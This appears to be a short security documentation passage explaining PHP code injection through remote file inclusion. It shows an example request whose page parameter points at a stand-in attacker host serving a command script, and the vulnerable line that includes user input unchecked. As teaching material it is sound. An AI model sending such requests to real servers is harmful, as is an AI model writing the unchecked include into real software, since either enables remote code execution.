Code Injection
==============

.. contents::

PHP code injection
------------------

The attack, in the form of an HTTP request

::

        index.php?page=http://badguy.tld/marlwar.cmd?cmd=ls

Resulting PHP code

::

        <? include ($_GET[page]); ?>

causes the web server to act like a client and download the software in question
